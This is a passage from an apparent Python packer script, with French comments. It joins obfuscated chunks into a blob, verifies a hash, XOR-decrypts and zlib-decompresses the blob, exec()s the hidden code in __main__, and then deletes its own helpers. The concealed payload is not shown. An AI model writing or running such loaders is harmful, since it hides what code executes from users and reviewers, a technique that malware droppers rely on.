_ctSpxpH0w94Kn5 + _csY5WLpHtOCyNa + _co9JSR7wiZoGFe + _crXbzmvvF0mGFX + _ceIEuICvJPyer9 + _cvQi_UmZy5wfpS + _csboOJo_ChNudq + _cs3vkoPeQuswvP + _cgA6SeYuPPmnQc + _cn_Q94c1cY5C2u + _cg4m4IhUicJ8Du + _cfH8rD6jDaSCdb + _caaespI7b0a8QC + _cwgo583ShylUcx + _cfi_NxGwQlwiNj + _csQxGuwgumy0Qb + _cnPE1pHRGojTTZ + _cbtrqICmpilegE + _cp9GJeL4hcdCiO + _crvK161Mo6w7yY + _cgmnqSyk6IHbsZ + _cizlKWz60XSReL + _cpc8jCfa2j7Qlv + _cmOjKzOVKMRTDH + _cnfktc95AiDjRF + _czW2pqah5XmQZt + _co1_seetTLrcaI + _cwLPM4vsH0Tav1 + _cvzPZhKD24nJvR + _cqG1JRQns8azTi + _cyk9KuECGIP6Ws + _cjRPos7qoUkmys + _cbTUoKyU8pY7SX + _chNGcCWZ5VJ887 + _clWMWwX18zwRJQ + _cr8uLlEkGrn3OU + _cjDWmDUJvU8AO0 + _ca0bshD9xt0OWG + _ckgQc3tkSFql8Q + _cr3jZH7457gMdu + _cldGEdGqKNAUGv + _cqU1cmCPZy4G9p + _cczPEZmKjQfYiv + _ckbkxXOVUSjPp7 + _cw1h6j7sqCUWQT + _cs568i99EZotuQ + _clgMJpWn6FHLPc + _ccAcJ3X6gMNxk5 + _clNJLCe2jobu3s + _cd8E0w5nHOYTq0 + _cjgevryX2FtLKe + _cfTIZ8NYWxfI2K + _clEA0OvLrwyJ6f + _cc3Kc44uJ9zUae + _cdw3hAzcVYkdc3 + _cyye2KlYHMrhHM + _cuhe12ar8aUHCm + _csGK6roGeBwsek + _czgYgmbQorI8bo + _ctrQB4K0sV64Kw + _ccScIF9Bd53eL4 + _cs8Mks953EoJt4 + _cqeUASKok80P7w + _chEecZZTWPsNTy + _cj7bW2o6FFTIvU + _cfq7zysCgEfnjq + _cnJEvNPxLITjEF + _clN4iOiDEMSVyp + _cjSytB4XVZHQ0K + _cg2b5wF0WPf6pT + _cvaJZMVo3bPcwH + _cvSlgyOkmqre1X + _cs_vw6VACACaqg + _cyxhPH5MTweLs4 + _cuvE9E6BjLmeRT + _cuTTbioP6IQ9m8 + _cofrVoq_LBDOoZ + _celDkdscc2lXr5 + _chyTtLPHnKxO1Z + _ce2G2pSUIX6cHC + _co1WCfpzbAw5RP + _cxJSmYaDFIpT6b + _cszNVg8CWME5If + _cifEAyHDo6zXLp + _cgl1rhgzqzB_tN + _c_SCLlBWHwGsyM + _czcAikixlN9vC3 + _cw36cAJWeTaQik + _cgeGhF6jsc7NW5 + _cd0xmg2jkf99IZ + _cou5dcRAlSZUhs + _cr7FLDPNy4x2rK + _cjXb3n20jJq7hR + _cv3D9T22zvrTAE + _ccfajcgBLJc7k2 + _csxWYTjFojMRes + _cuFnNkLKNAdZoR + _czG8o2YtVLeZXu + _cw0jOQvk6ajvuM + _cdifiexyOc_P6g + _cs4MzWGRnh6jrh + _csEMZCXwYUQkS6 + _cyiJ6qxF6Aoyxn + _cdYIgMmULicibA + _cnX8BF_WPpGHBF + _claV85REX_tVHu + _clKIdt7uBEv9kA + _cxK9lasiLxRfov + _cloaJclnqL6S6A + _cfbumarGMWqhYH + _ciMg1t4iXBBPhz + _ckVRQ7OVHkkUMw + _cjQtFr7msf5ZvZ + _crnJ4pM1U0vwrL + _ctzjGc28N51PCU + _clrUBggdJ6V51x + _caMiFxFQu6v7pD + _cq6TprwBpMWa46 + _ccfGy5aTg2zIm9 + _cwC6tHBPrDAjVd + _cnFWtB7clfWewy + _cifWmzoGlcM7QA + _cj4QC2NoTPkpoX + _cyzpDuTTSEULoj + _cdjKofir4Awwqf + _ceMHyFYXDhCnJo + _cuFLXcdmHF9x3r + _cns0rFjYGlsnjZ + _cbxFpqhCs3gxZ3 + _coBofmxnGY9_R_ + _cdGTksKpo3Jv8U + _cjetMQpxk0jbeR + _ciqOKa28NE1p4n + _cde9UGtGoz4Knv + _chfcypIWexDi5s + _co4eFnxvxDMXlj + _csvfqga5ZiB90y + _cqK3mQ1eTmhM5D + _cvtczvAf3evTs0 + _cbhpMCn35Gq4Lr + _cm0NW5cpwZrkJM + _cgdBz3PUHrJFvd + _cjnfdtt61IyarI + _caVm23KP7_ve8c + _cvLNoQxvB60Lat)
if __import__('hashlib').sha256(_pixAIQnrSsqJY7).hexdigest() != '077e26b4d90359347c28254c75db065d4d0e7fef75c05f201eebf905cfccddb2':
    __import__('sys').exit(1)
_xkCRwrKtNI4qNo = bytes([58, 182, 227, 56, 102, 21, 97, 115, 54, 49])
_fkfrV5xusp7FsCJ = bytes([133, 204, 223, 113, 142, 145, 212, 163, 61, 207])

def _fx_Wdc4FwR0PRbZ(_bbMWowJyxXkor1, _kcYYGF7A54hp7i):
    return bytes(_bbMWowJyxXkor1[_ik2i0XMop8pKVI] ^ _kcYYGF7A54hp7i[_ik2i0XMop8pKVI % len(_kcYYGF7A54hp7i)] for _ik2i0XMop8pKVI in range(len(_bbMWowJyxXkor1)))

def _fdjIHRLm15_q6Gz(_ttWnbCnWHNkwGs):
    import zlib
    return zlib.decompress(_ttWnbCnWHNkwGs) # Un seul niveau de zlib ici pour simplifier

def _fehZSGOZDsG6Qoq():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xdGrJspJCist3Y = _fx_Wdc4FwR0PRbZ(_pixAIQnrSsqJY7, _xkCRwrKtNI4qNo)
    # 2. Décompression Zlib
    _dkwNFLab3PMnsu = _fdjIHRLm15_q6Gz(_xdGrJspJCist3Y)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dkwNFLab3PMnsu.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nnSoootz2SOhRu = _main.__dict__
    _nnSoootz2SOhRu.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nnSoootz2SOhRu)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fehZSGOZDsG6Qoq()
try:
    del _fx_Wdc4FwR0PRbZ, _fdjIHRLm15_q6Gz, _fehZSGOZDsG6Qoq
    del _pixAIQnrSsqJY7, _xkCRwrKtNI4qNo, _fkfrV5xusp7FsCJ
except:
    pass
